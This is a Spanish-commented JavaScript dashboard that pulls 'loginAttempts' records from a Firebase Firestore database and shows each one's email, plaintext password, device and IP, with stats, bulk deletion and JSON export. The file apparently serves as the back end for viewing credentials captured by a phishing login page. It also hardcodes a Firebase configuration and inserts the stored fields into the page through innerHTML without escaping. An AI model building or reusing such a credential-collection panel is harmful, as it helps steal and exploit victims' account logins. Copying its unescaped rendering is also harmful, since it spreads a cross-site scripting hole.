// 🔥 CONFIGURACIÓN FIREBASE - MISMA CONFIGURACIÓN
const firebaseConfig = {
  apiKey: "AIzaSyBcdFsHGjJ1FCok9lw9q-zG-I9C91L7KsU",
  authDomain: "mi-login-app-dd899.firebaseapp.com",
  projectId: "mi-login-app-dd899",
  storageBucket: "mi-login-app-dd899.firebasestorage.app",
  messagingSenderId: "462347115903",
  appId: "1:462347115903:web:23bed26b7fc2dbd57b4e4a"
};

// Inicializar Firebase
try {
    firebase.initializeApp(firebaseConfig);
    console.log('✅ Firebase inicializado correctamente');
} catch (error) {
    console.error('❌ Error inicializando Firebase:', error);
}

const db = firebase.firestore();

document.addEventListener('DOMContentLoaded', function() {
    const dataContent = document.getElementById('dataContent');
    const refreshBtn = document.getElementById('refreshData');
    const clearBtn = document.getElementById('clearData');
    const exportBtn = document.getElementById('exportData');
    const totalAttempts = document.getElementById('totalAttempts');
    const successAttempts = document.getElementById('successAttempts');
    const failedAttempts = document.getElementById('failedAttempts');

    // Cargar datos al iniciar
    loadData();

    // Botón actualizar
    refreshBtn.addEventListener('click', loadData);

    // Botón limpiar
    clearBtn.addEventListener('click', function() {
        if (confirm('¿Estás seguro de que quieres eliminar TODOS los datos de Firebase?')) {
            clearFirebaseData();
        }
    });

    // Botón exportar
    exportBtn.addEventListener('click', exportData);

    async function loadData() {
        try {
            console.log('🔄 Cargando datos desde Firebase...');
            
            const snapshot = await db.collection('loginAttempts')
                .orderBy('timestamp', 'desc')
                .limit(100)
                .get();
            
            const loginAttempts = [];
            snapshot.forEach(doc => {
                loginAttempts.push(doc.data());
            });
            
            console.log('📊 Datos recibidos:', loginAttempts.length, 'registros');
            
            updateStats(loginAttempts);
            updateDataContent(loginAttempts);
            
        } catch (error) {
            console.error('❌ Error cargando datos:', error);
            alert('Error de conexión: ' + error.message);
        }
    }

    async function clearFirebaseData() {
        try {
            const snapshot = await db.collection('loginAttempts').get();
            const batch = db.batch();
            
            snapshot.forEach(doc => {
                batch.delete(doc.ref);
            });
            
            await batch.commit();
            alert('🗑️ Todos los datos han sido eliminados de Firebase');
            loadData();
            
        } catch (error) {
            console.error('Error eliminando datos:', error);
            alert('Error eliminando datos: ' + error.message);
        }
    }

    function updateStats(attempts) {
        totalAttempts.textContent = attempts.length;
        
        const success = attempts.filter(attempt => attempt.status && attempt.status.includes('CORRECTO')).length;
        const failed = attempts.filter(attempt => attempt.status && attempt.status.includes('INCORRECTO')).length;
        
        successAttempts.textContent = success;
        failedAttempts.textContent = failed;
    }

    function updateDataContent(loginAttempts) {
        if (loginAttempts.length === 0) {
            dataContent.innerHTML = '<p class="no-data">No hay datos guardados aún</p>';
            return;
        }

        let html = '';
        loginAttempts.forEach((attempt, index) => {
            const statusClass = attempt.status && attempt.status.includes('CORRECTO') ? 'status-correct' : 'status-incorrect';
            const timestamp = new Date(attempt.timestamp).toLocaleString();
            
            html += `
                <div class="user-data">
                    <div class="user-header">
                        <span class="user-email">📧 ${attempt.email || 'N/A'}</span>
                        <span class="status ${statusClass}">${attempt.status || '❌ INCORRECTO'}</span>
                    </div>
                    <div class="user-password">🔑 ${attempt.password || 'N/A'}</div>
                    <div class="user-meta">
                        ⏰ ${timestamp} 
                        ${attempt.device ? `<br>${attempt.device}` : ''}
                        ${attempt.ip ? `<br>🌐 IP: ${attempt.ip}` : ''}
                    </div>
                </div>
            `;
        });

        dataContent.innerHTML = html;
    }

    function exportData() {
        const allData = Array.from(document.querySelectorAll('.user-data')).map(item => ({
            email: item.querySelector('.user-email').textContent.replace('📧 ', ''),
            password: item.querySelector('.user-password').textContent.replace('🔑 ', ''),
            status: item.querySelector('.status').textContent,
            timestamp: item.querySelector('.user-meta').textContent.split('⏰ ')[1]?.split('<br>')[0],
            device: item.querySelector('.user-meta').innerHTML.includes('device') ? 
                    item.querySelector('.user-meta').innerHTML.split('<br>')[1] : '',
            ip: item.querySelector('.user-meta').innerHTML.includes('IP:') ? 
                 item.querySelector('.user-meta').innerHTML.split('IP: ')[1] : ''
        }));

        const dataToExport = {
            exportDate: new Date().toISOString(),
            totalRecords: allData.length,
            loginAttempts: allData
        };

        const blob = new Blob([JSON.stringify(dataToExport, null, 2)], { type: 'application/json' });
        const url = URL.createObjectURL(blob);
        const a = document.createElement('a');
        a.href = url;
        a.download = `datos-login-${new Date().toISOString().split('T')[0]}.json`;
        document.body.appendChild(a);
        a.click();
        document.body.removeChild(a);
        URL.revokeObjectURL(url);
        
        alert(`✅ Datos exportados correctamente (${allData.length} registros)`);
    }
});
